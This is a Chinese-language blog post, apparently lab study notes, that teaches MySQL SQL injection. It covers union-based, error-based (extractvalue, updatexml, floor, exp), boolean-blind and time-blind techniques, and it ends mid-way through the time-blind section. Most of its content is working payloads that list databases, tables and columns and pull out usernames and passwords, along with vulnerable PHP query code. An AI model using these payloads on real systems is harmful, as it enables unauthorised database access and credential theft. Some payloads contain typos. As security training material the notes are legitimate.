        <content type="html"><![CDATA[<h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><h2 id="引发注入的原因"><a href="#引发注入的原因" class="headerlink" title="引发注入的原因"></a>引发注入的原因</h2><p>注入的产生原因通常表现在以下几方面：</p><p>①不当的类型处理；</p><p>②不安全的数据库配置；</p><p>③不合理的查询集处理；</p><p>④不当的错误处理；</p><p>⑤转义字符处理不合适；</p><p>⑥多个提交处理不当</p><p>注入点根据不同维度可分为：</p><h2 id="注入的类型"><a href="#注入的类型" class="headerlink" title="注入的类型"></a>注入的类型</h2><p>1.根据请求方式分类：</p><ul><li><p>GET 方式请求注入</p></li><li><p>POST方式请求注入</p></li></ul><p>2.根据注入点参数分类</p><ul><li><p>整数型注入</p><p>select uname,password from users where uid=$id</p></li><li><p>字符型注入</p><p>select uname,password from users where uid=’$id’</p></li><li><p>搜索型注入</p><p>select uname,password from users where uname like ‘%a%’</p></li></ul><p>3.根据SQL注入点反馈类型分类（重点）</p><ul><li><p>union类型</p></li><li><p>基于错误显示</p></li><li><p>布尔类型</p></li><li><p>基于时间</p></li><li><p>其他类型</p></li></ul><p>4.根据Web应用的数据库类型分类（数据库样式扩充）</p><ul><li><p>MySQL</p></li><li><p>SQL Server</p></li><li><p>Oracle</p></li><li><p>Acces</p></li></ul><h2 id="注入的流程"><a href="#注入的流程" class="headerlink" title="注入的流程"></a>注入的流程</h2><p>1、判断是否有注入漏洞，识别注入点类型</p><p>2、获取数据库中的信息</p><ul><li>获取数据库基本信息（数据库版本、数据库类型、查寻列数等）</li><li>获取数据库名</li><li>获取表名</li><li>获取列名</li><li>获取数据</li></ul><ul><li>获取数据库中信息：查看数据  (<strong>information_schema</strong>库)</li></ul><h3 id="系统信息表"><a href="#系统信息表" class="headerlink" title="系统信息表"></a>系统信息表</h3><p><strong>information_schema 库</strong></p><table><thead><tr><th>表名</th><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>schemata</td><td>–schema_name</td><td>存放所有的库名</td></tr><tr><td>tables</td><td>–table_schema<br/>–table_name</td><td>存放所有的表名</td></tr><tr><td>columns</td><td>–table_schema<br/>–table_name<br/>–column_name</td><td>存放所有的表字段信息</td></tr></tbody></table><ul><li><strong>SCHEMATA</strong>   </li></ul><p>当前MySQL中所有数据库信息。SHOW DATABASES 命令:命令从这个表获取数据。</p><p><strong>TABLES</strong>      </p><p>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FORM XX 命令：从这个表获取结果。</p><p><strong>COLUMNS</strong>   </p><p> 存储表中的列信息，包括表有多少列、每个列的类型等。SHOW COLUMNS FROM schemaname.tablename 命令：从这个表获取结果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> <span class="keyword">table</span> schema <span class="operator">=</span> ‘dvwa ’#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> <span class="keyword">table</span> schema <span class="operator">=</span> database()#</span><br></pre></td></tr></table></figure><h2 id="常用函数："><a href="#常用函数：" class="headerlink" title="常用函数："></a><strong>常用函数：</strong></h2><p>**Concat()**：将多个字符串链接成一个字符串 ,拼接字符串</p><p>**Concat_ws()**和concat()一样：将多列 字符串链接成一个多个单列字符串，但可以指定分隔符</p><p><strong>Group_concat</strong>()：将多行结果连接成一组(一行)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,concat_ws(&#x27;</span>_<span class="string">&#x27;,user,pass) from message.user #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="keyword">user</span>,<span class="string">&#x27;_&#x27;</span>,pass) <span class="keyword">from</span> message.user #</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$qsql</span> = <span class="string">&quot;select * from message where id =&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$qsql</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);  <span class="comment">//查询一条</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;   <span class="comment">//while 全输出了查询的所有条数,只要满足union 相同列出的查询.</span></span><br><span class="line">               <span class="comment">// Get values</span></span><br><span class="line">               <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">               <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br></pre></td></tr></table></figure><p>当只有一行输出的时候  可以用concat 或者 limit单行输出</p><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><h2 id="第一步判断注入点"><a href="#第一步判断注入点" class="headerlink" title="第一步判断注入点"></a>第一步判断注入点</h2><ul><li>判断是否存在注入，判断注入点类型：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #（整型）</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> #（整型）</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>’ <span class="keyword">or</span> ‘<span class="number">1</span>’<span class="operator">=</span>‘<span class="number">1</span>（字符型）</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>’ <span class="keyword">or</span> ‘<span class="number">1</span>’<span class="operator">=</span>‘<span class="number">2</span>（字符型）</span><br></pre></td></tr></table></figure><p>#表示：如果用户可控的传值位置不在末尾，那么#以后的sql语句会注释掉，不进行编译</p><p>and表示：and两边都为真时，那么结果为真，返回正确结果，反之返回false</p><p>or表示：or两边只要有一边为真，那么结果为真，返回正确结果，反之返回false</p><h2 id="第二步判断列数"><a href="#第二步判断列数" class="headerlink" title="第二步判断列数"></a>第二步判断列数</h2><ul><li>获取数据库中信息：判断列</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>\#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>’ <span class="keyword">order</span> <span class="keyword">by</span> n\#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>’ <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> n \#</span><br></pre></td></tr></table></figure><h2 id="第三步判断回显位"><a href="#第三步判断回显位" class="headerlink" title="第三步判断回显位"></a>第三步判断回显位</h2><ul><li>获取数据库中信息：判断数据显</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">union</span> select1，<span class="number">2</span>#</span><br></pre></td></tr></table></figure><p>备注：这里使用-1或者一个不错在的数,使union之前的语句查询无结果，则显示的时候就会显示union之后的第二条语句</p><h2 id="第四步获取数据库中信息"><a href="#第四步获取数据库中信息" class="headerlink" title="第四步获取数据库中信息"></a>第四步获取数据库中信息</h2><ul><li>获取数据库中信息：用户、版本、数据库名等</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> version(), <span class="keyword">user</span>()#</span><br><span class="line"></span><br><span class="line"><span class="keyword">User</span>()  #返回当前数据库用户</span><br><span class="line"></span><br><span class="line">Version()  #返回当前数据库版本</span><br><span class="line"></span><br><span class="line">Database()  #返回当前数据库名</span><br></pre></td></tr></table></figure><h2 id="第五步跑数据库"><a href="#第五步跑数据库" class="headerlink" title="第五步跑数据库"></a>第五步跑数据库</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#跑所有的库名:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select schema_name from information_schema limit 0,1 -- -</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> concat_gorup(schema_name) <span class="keyword">from</span> information_schema limit <span class="number">0</span>,<span class="number">1</span> <span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line">#跑出message库所有的表名</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select  1,2,group_concat(table_name,&#x27;</span>_<span class="string">&#x27;,table_schema) from information_schema.tables where table_schema=&#x27;</span>message<span class="string">&#x27;-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#跑出message库admin表所有的字段</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span>  <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name,<span class="string">&#x27;_&#x27;</span>,column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;message&#x27;</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line">#跑出message库<span class="keyword">user</span>表内容</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入概"><a href="#报错注入概" class="headerlink" title="报错注入概"></a>报错注入概</h2><p>利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息</p><p>1.XPATH报错注入的使用条件是数据库版本符合条件</p><p>2.extractvalue()和updatexml()有<strong>32</strong>位回显长度限制,需要用count()函数显示查询数量,在配合limit一行一行查询.</p><h2 id="XPATH报错注入"><a href="#XPATH报错注入" class="headerlink" title="XPATH报错注入"></a>XPATH报错注入</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(arg1,arg2)  <span class="operator">/</span><span class="operator">/</span>接受两个参数</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>arg1：XML文档，arg2：XPATH语句</span><br></pre></td></tr></table></figure><p>条件：mysql5.1及以上版本</p><p>标准payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">updatexml(arg1,arg2,arg3)   <span class="operator">/</span><span class="operator">/</span>接受三个参数</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>arg1为xml文档对象的名称；arg2为xpath格式的字符串；arg3为str格式替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure><p>条件：mysql5.1.5及以上版本</p><p>标准payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="xpath注入过程"><a href="#xpath注入过程" class="headerlink" title="xpath注入过程"></a>xpath注入过程</h3><p>1、查看数据库版本:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select version()),0x7e))</span></span><br></pre></td></tr></table></figure><p>2、查看数据库名字：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))</span></span><br></pre></td></tr></table></figure><p>3、查看数据库有多少个表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e))</span></span><br></pre></td></tr></table></figure><p>4、查看数据库有哪些表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))</span></span><br></pre></td></tr></table></figure><p>5、查看表里面有哪些列名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select column_name information_schema.columns where table_schema=database() and table_name=&#x27;</span>表名<span class="string">&#x27;limit 0,1),0x7e))</span></span><br></pre></td></tr></table></figure><p>6、查看表里面的数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>‘ <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(列名)<span class="keyword">from</span> 数据库名.表名),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><ul><li><strong>30位回显字符限制可以用substr()函数分段截取显示</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> substr(concat(password),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> substr(group_concat(table_name,<span class="string">&#x27;_&#x27;</span>,column_name),<span class="number">7</span>,<span class="number">27</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>)) <span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h2><ul><li><p>floor()报错注入准确地说应该是floor、count、group by冲突报错，count(*)、rand()、group by三者缺一不可</p></li><li><p>floor()函数的作用是返回小于等于该值的最大整数，只返回arg1整数部分，小数部分舍弃标准</p></li><li><p>条件：mysql5.0及以上版本</p></li></ul><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)y)</span><br></pre></td></tr></table></figure><p>公式解析：</p><p>•floor()——取整数</p><p>•rand(0)<em>2——将取0到2的随机数</em></p><p>*•floor(rand()*2)——有两条记录就会报错</p><p>•floor (rand(0)*2)——记录需为3条以上，且3条以上必报错，返回的值是有规律的</p><p>•count(*)——用来统计结果，相当于刷新一次结果</p><p>•groupby——在对数据进行分组时会先看虚拟表中是否存在这个值，不存在就插入；存在的话count(*)加1，在使用groupby时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次</p><h2 id="其他报错注入"><a href="#其他报错注入" class="headerlink" title="其他报错注入"></a>其他报错注入</h2><h3 id="列名重复报错注入"><a href="#列名重复报错注入" class="headerlink" title="列名重复报错注入"></a>列名重复报错注入</h3><p>•条件：name_const()函数在低版本中可以支持5.0，但是在高版本5.1+中就不支持了<br>•说明：name_const(name,value)，当用来产生一个结果集合列时,name_const()促使该列使用给定名称<br>•标准Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> NAME_CONST(version(),<span class="number">1</span>),NAME_CONST(version(),<span class="number">1</span>))a;</span><br></pre></td></tr></table></figure><h3 id="整形溢出报错注入"><a href="#整形溢出报错注入" class="headerlink" title="整形溢出报错注入"></a>整形溢出报错注入</h3><p>•条件：mysql5.5.5及以上版本</p><p>•说明：exp是以e为底的指数函数，由于数字太大会产生溢出。该函数会在参数大于709时溢出，产生报错</p><p>•标准Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure><h3 id="几何函数报错注入"><a href="#几何函数报错注入" class="headerlink" title="几何函数报错注入"></a>几何函数报错注入</h3><p>•条件：高版本MySQL无法得到数据</p><p>•相关函数：geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()</p><p>•说明：函数对参数要求是形如(12,33,221)这样几何数据，如果不满足要求，则会报错</p><p>•标准Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> version())a)b)c))</span><br></pre></td></tr></table></figure><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>第一步判断当前数据库表的数量</p><ul><li><strong>count(*)</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.schemata;  <span class="operator">/</span><span class="operator">/</span>判断数据库的数量</span><br></pre></td></tr></table></figure><p>第二步判断当前数据库每个表名的长度</p><ul><li><strong>length(*)</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> length(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>第三步爆当前数据库表的名字</p><ul><li><strong>substr(string,start,count)</strong></li></ul><p>string:字符串</p><p>start:截取的启始位置</p><p>count:每次截取字符的数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><strong>ASCII()</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><p>第四步爆当前数据库的字段长度及字段名</p><p>爆长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure><p>爆字段长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> length(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;i&#x27;</span>   <span class="operator">/</span><span class="operator">/</span>爆字母</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>   <span class="operator">/</span>爆ASCII码</span><br></pre></td></tr></table></figure><p>第五步爆当前数据库表的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="operator">/</span><span class="operator">/</span>爆字母</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="operator">/</span><span class="operator">/</span>爆ASCII</span><br></pre></td></tr></table></figure><ul><li><strong>information_schema表名字段一把梭</strong></li></ul><p>1判断查询数据的数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.182</span><span class="number">.182</span><span class="operator">/</span>admin<span class="operator">/</span>action.php?action<span class="operator">=</span>usermod<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">23</span><span class="string">&#x27; and (select length(group_concat(column_name,&#x27;</span>_<span class="string">&#x27;,table_name,&#x27;</span>_<span class="string">&#x27;,table_schema)) from information_schema.columns where table_schema=database())=359 %23</span></span><br></pre></td></tr></table></figure><p>2一把梭</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.182</span><span class="number">.182</span><span class="operator">/</span>admin<span class="operator">/</span>action.php?action<span class="operator">=</span>usermod<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">23</span><span class="string">&#x27; and substr((select group_concat(column_name,&#x27;</span>_<span class="string">&#x27;,table_name,&#x27;</span>_<span class="string">&#x27;,table_schema) from information_schema.columns where table_schema=database()),1,1) =&#x27;</span>i<span class="string">&#x27; %23</span></span><br></pre></td></tr></table></figure><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><ul><li><strong>sleep()</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">3</span>),<span class="string">&#x27;goodbye&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>benchmark()</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,benchmark(<span class="number">5000000</span>,md5(<span class="string">&#x27;abc&#x27;</span>)),<span class="string">&#x27;goodbye&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="盲注基本过程"><a href="#盲注基本过程" class="headerlink" title="盲注基本过程"></a>盲注基本过程</h2><p>1、获得数据库名的长度</p><p>and if((length(database())&gt;5),sleep(5),1)#</p><p>and if((length(database())=6),sleep(5),1)#</p><p>2、获得数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if((ascii(substr(database(),n,<span class="number">1</span>))<span class="operator">=</span>m),sleep(<span class="number">5</span>),<span class="number">1</span>)#通过改变n和m依次获取数据库的字符</span><br></pre></td></tr></table></figure><p>3、获得数据库表名(先获取长度)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if((ascii(substr((<span class="keyword">select</span> table_namefrom information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">100</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p>4、获取数据库列名(先获取长度)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if((ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">100</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p>5、获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if((ascii(substr(( <span class="keyword">select</span> 列名 <span class="keyword">from</span> 表名 limit <span 